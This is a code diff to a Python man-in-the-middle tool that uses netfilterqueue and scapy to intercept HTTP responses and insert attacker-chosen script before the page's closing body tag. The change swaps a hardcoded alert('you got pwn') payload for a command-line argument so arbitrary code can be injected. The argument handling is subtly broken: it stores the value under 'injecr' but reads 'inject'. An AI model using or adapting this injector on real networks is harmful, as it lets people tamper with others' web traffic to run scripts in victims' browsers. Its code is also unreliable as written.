@@ -2,6 +2,15 @@
 import netfilterqueue
 import scapy.all as scapy
 import re
+import argparse
+
+def args():
+    parser = argparse.ArgumentParser()
+    parser.add_argument('-i','--inject', dest='injecr', help='Code to inject in Webpage')
+    (val) =  parser.parse_args()
+    if not val.inject:
+        parser.error('INVALID ARGS, USE --help')
+    return val
 
 def sload(pacc, load):
     pacc[scapy.Raw].load = load
@@ -22,7 +31,7 @@ def ppacc(pacc):
             elif scapypacc[scapy.TCP].sport == 80:
                     print('\nRESPONSE!')
                     #print(scapypacc.show())
-                    inject = "<script>alert('you got pwn');</script>"
+                    inject = val.inject
                     load = load.replace('</body>', inject+'</body>')
                     clengthS = re.search('(?:Content-Length:\s)(\d*)', load)
                     if clengthS and 'text/html' in load:
@@ -38,6 +47,7 @@ def ppacc(pacc):
 
     pacc.accept()
 
+val = args()
 que = netfilterqueue.NetfilterQueue()
 que.bind(0, ppacc)
 que.run()
